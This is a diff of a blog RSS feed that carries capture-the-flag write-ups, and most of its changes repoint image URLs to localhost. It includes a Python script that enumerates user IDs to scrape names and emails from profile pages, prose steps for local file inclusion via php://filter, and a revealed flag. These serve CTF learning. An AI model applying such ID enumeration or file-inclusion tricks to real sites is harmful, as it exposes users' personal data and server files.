+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name_tag&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;email_tag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;# Extract the text after &amp;#34;Name: &amp;#34; and &amp;#34;Email: &amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name_tag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;email&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;email_tag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;email&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Could not find profile information in HTML content.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Main function to fetch profiles for userId 0-61 and save to a file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;profiles.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Fetching profile for userId: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;html_content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fetch_profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;html_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;email&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parse_profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;userId: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, Name: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, Email: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;userId: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, Profile information not found&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;userId: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, Failed to fetch profile&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Extracting the Flag&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Review the extracted data from the brute force script.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Rather than decoding the base64 text, find the flag directly in the data without further processing.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/character-journey/brute%20force.png&#34;
+	width=&#34;1321&#34;
+	height=&#34;595&#34;
+	srcset=&#34;http://localhost:1313/post/character-journey/brute%20force_huc0740853aaeb6e0eca77cd66f778ec41_181481_480x0_resize_box_3.png 480w, http://localhost:1313/post/character-journey/brute%20force_huc0740853aaeb6e0eca77cd66f778ec41_181481_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Brute Force&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;222&#34;
+		data-flex-basis=&#34;532px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/character-journey/flag.png&#34;
+	width=&#34;1454&#34;
+	height=&#34;131&#34;
+	srcset=&#34;http://localhost:1313/post/character-journey/flag_hub09a354196561355ceef2942c13b7f2a_51433_480x0_resize_box_3.png 480w, http://localhost:1313/post/character-journey/flag_hub09a354196561355ceef2942c13b7f2a_51433_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1109&#34;
+		data-flex-basis=&#34;2663px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;: &lt;strong&gt;ihack24{655b7b7ae4c62d726a568eff8914573e}&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
         <title>Anti-Brute</title>
-        <link>https://qiaonpc.github.io/post/anti-brute/</link>
+        <link>http://localhost:1313/post/anti-brute/</link>
         <pubDate>Sat, 09 Mar 2024 00:00:00 +0000</pubDate>
         
-        <guid>https://qiaonpc.github.io/post/anti-brute/</guid>
+        <guid>http://localhost:1313/post/anti-brute/</guid>
         <description>&lt;h1 id=&#34;anti-brute-ctf-challenge-writeup&#34;&gt;Anti-Brute CTF Challenge Writeup
 &lt;/h1&gt;&lt;h2 id=&#34;challenge-information&#34;&gt;Challenge Information
 &lt;/h2&gt;&lt;ul&gt;
@@ -99,10 +928,10 @@
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;Successfully extracted the flag using the Python script.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://qiaonpc.github.io/post/anti-brute/flag.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/anti-brute/flag.png&#34;
 	width=&#34;1421&#34;
 	height=&#34;125&#34;
-	srcset=&#34;https://qiaonpc.github.io/post/anti-brute/flag_hu70177659de8d29f46dbc14130d435627_24112_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/anti-brute/flag_hu70177659de8d29f46dbc14130d435627_24112_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/anti-brute/flag_hu70177659de8d29f46dbc14130d435627_24112_480x0_resize_box_3.png 480w, http://localhost:1313/post/anti-brute/flag_hu70177659de8d29f46dbc14130d435627_24112_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Flag&#34;
@@ -121,10 +950,10 @@
         </item>
         <item>
         <title>BlackHole</title>
-        <link>https://qiaonpc.github.io/post/blackhole/</link>
+        <link>http://localhost:1313/post/blackhole/</link>
         <pubDate>Sat, 09 Mar 2024 00:00:00 +0000</pubDate>
         
-        <guid>https://qiaonpc.github.io/post/blackhole/</guid>
+        <guid>http://localhost:1313/post/blackhole/</guid>
         <description>&lt;h1 id=&#34;blackhole-ctf-challenge-writeup&#34;&gt;BlackHole CTF Challenge Writeup
 &lt;/h1&gt;&lt;h2 id=&#34;challenge-information&#34;&gt;Challenge Information
 &lt;/h2&gt;&lt;ul&gt;
@@ -275,10 +1104,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;However, the flag was not directly found in the flag.txt file.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://qiaonpc.github.io/post/blackhole/found%20flag%20txt.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/blackhole/found%20flag%20txt.png&#34;
 	width=&#34;1716&#34;
 	height=&#34;196&#34;
-	srcset=&#34;https://qiaonpc.github.io/post/blackhole/found%20flag%20txt_hu616649496a87b75ff98fd1cb788aac22_68500_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/blackhole/found%20flag%20txt_hu616649496a87b75ff98fd1cb788aac22_68500_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/blackhole/found%20flag%20txt_hu616649496a87b75ff98fd1cb788aac22_68500_480x0_resize_box_3.png 480w, http://localhost:1313/post/blackhole/found%20flag%20txt_hu616649496a87b75ff98fd1cb788aac22_68500_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Found Flag&#34;
@@ -297,10 +1126,10 @@
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;Revisited the challenge&amp;rsquo;s instructions to reread the URL.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://qiaonpc.github.io/post/blackhole/not%20flag.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/blackhole/not%20flag.png&#34;
 	width=&#34;1509&#34;
 	height=&#34;425&#34;
-	srcset=&#34;https://qiaonpc.github.io/post/blackhole/not%20flag_hu5efd3358d11090c77692e3be0786ca1e_40675_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/blackhole/not%20flag_hu5efd3358d11090c77692e3be0786ca1e_40675_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/blackhole/not%20flag_hu5efd3358d11090c77692e3be0786ca1e_40675_480x0_resize_box_3.png 480w, http://localhost:1313/post/blackhole/not%20flag_hu5efd3358d11090c77692e3be0786ca1e_40675_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Not Flag&#34;
@@ -322,10 +1151,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Discovered the flag hidden within the URL.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://qiaonpc.github.io/post/blackhole/flag.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/blackhole/flag.png&#34;
 	width=&#34;1382&#34;
 	height=&#34;606&#34;
-	srcset=&#34;https://qiaonpc.github.io/post/blackhole/flag_huac342a464fe486df40127de1c266f154_90327_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/blackhole/flag_huac342a464fe486df40127de1c266f154_90327_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/blackhole/flag_huac342a464fe486df40127de1c266f154_90327_480x0_resize_box_3.png 480w, http://localhost:1313/post/blackhole/flag_huac342a464fe486df40127de1c266f154_90327_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Flag&#34;
@@ -344,10 +1173,10 @@
         </item>
         <item>
         <title>SimpleLazy</title>
-        <link>https://qiaonpc.github.io/post/simplelazy/</link>
+        <link>http://localhost:1313/post/simplelazy/</link>
         <pubDate>Sat, 09 Mar 2024 00:00:00 +0000</pubDate>
         
-        <guid>https://qiaonpc.github.io/post/simplelazy/</guid>
+        <guid>http://localhost:1313/post/simplelazy/</guid>
         <description>&lt;h1 id=&#34;simplelazy-ctf-challenge-writeup&#34;&gt;SimpleLazy CTF Challenge Writeup
 &lt;/h1&gt;&lt;h2 id=&#34;challenge-information&#34;&gt;Challenge Information
 &lt;/h2&gt;&lt;ul&gt;
@@ -367,10 +1196,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Discovered that input was always appended with &lt;code&gt;.php&lt;/code&gt;, limiting directory traversal options.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://qiaonpc.github.io/post/simplelazy/initial%20page.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/simplelazy/initial%20page.png&#34;
 	width=&#34;1700&#34;
 	height=&#34;818&#34;
-	srcset=&#34;https://qiaonpc.github.io/post/simplelazy/initial%20page_huaecab7e789f6bc1b44c4a64e152cac04_43171_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/simplelazy/initial%20page_huaecab7e789f6bc1b44c4a64e152cac04_43171_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/simplelazy/initial%20page_huaecab7e789f6bc1b44c4a64e152cac04_43171_480x0_resize_box_3.png 480w, http://localhost:1313/post/simplelazy/initial%20page_huaecab7e789f6bc1b44c4a64e152cac04_43171_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Initial Page&#34;
@@ -392,10 +1221,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Utilized &lt;code&gt;php://filter&lt;/code&gt; to retrieve PHP files in base64 format, allowing for remote file inclusion.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://qiaonpc.github.io/post/simplelazy/part%201.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/simplelazy/part%201.png&#34;
 	width=&#34;1551&#34;
 	height=&#34;617&#34;
-	srcset=&#34;https://qiaonpc.github.io/post/simplelazy/part%201_hu6fd83f9012763277fd5a3f9d5778f2e5_38374_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/simplelazy/part%201_hu6fd83f9012763277fd5a3f9d5778f2e5_38374_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/simplelazy/part%201_hu6fd83f9012763277fd5a3f9d5778f2e5_38374_480x0_resize_box_3.png 480w, http://localhost:1313/post/simplelazy/part%201_hu6fd83f9012763277fd5a3f9d5778f2e5_38374_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;LFI&#34;
@@ -417,10 +1246,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Discovered the inclusion of a suspicious file in the PHP source code.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://qiaonpc.github.io/post/simplelazy/part%201%201.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/simplelazy/part%201%201.png&#34;
 	width=&#34;855&#34;
 	height=&#34;656&#34;
-	srcset=&#34;https://qiaonpc.github.io/post/simplelazy/part%201%201_hu714f4622ddc1e4f1a28480ab768a477f_48643_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/simplelazy/part%201%201_hu714f4622ddc1e4f1a28480ab768a477f_48643_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/simplelazy/part%201%201_hu714f4622ddc1e4f1a28480ab768a477f_48643_480x0_resize_box_3.png 480w, http://localhost:1313/post/simplelazy/part%201%201_hu714f4622ddc1e4f1a28480ab768a477f_48643_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;LFI&#34;
@@ -442,10 +1271,10 @@
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Decoded the contents of the suspicious file to reveal the flag.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://qiaonpc.github.io/post/simplelazy/part%202.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/simplelazy/part%202.png&#34;
 	width=&#34;1276&#34;
 	height=&#34;650&#34;
-	srcset=&#34;https://qiaonpc.github.io/post/simplelazy/part%202_huc681cad5303f309973418a29e5cd977a_36438_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/simplelazy/part%202_huc681cad5303f309973418a29e5cd977a_36438_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/simplelazy/part%202_huc681cad5303f309973418a29e5cd977a_36438_480x0_resize_box_3.png 480w, http://localhost:1313/post/simplelazy/part%202_huc681cad5303f309973418a29e5cd977a_36438_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;LFI&#34;
@@ -456,10 +1285,10 @@
 		data-flex-basis=&#34;471px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://qiaonpc.github.io/post/simplelazy/part%202%202.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/simplelazy/part%202%202.png&#34;
 	width=&#34;871&#34;
 	height=&#34;629&#34;
-	srcset=&#34;https://qiaonpc.github.io/post/simplelazy/part%202%202_hu4140144bc8ea9171d3f70156eaadfb09_31425_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/simplelazy/part%202%202_hu4140144bc8ea9171d3f70156eaadfb09_31425_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/simplelazy/part%202%202_hu4140144bc8ea9171d3f70156eaadfb09_31425_480x0_resize_box_3.png 480w, http://localhost:1313/post/simplelazy/part%202%202_hu4140144bc8ea9171d3f70156eaadfb09_31425_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Flag&#34;
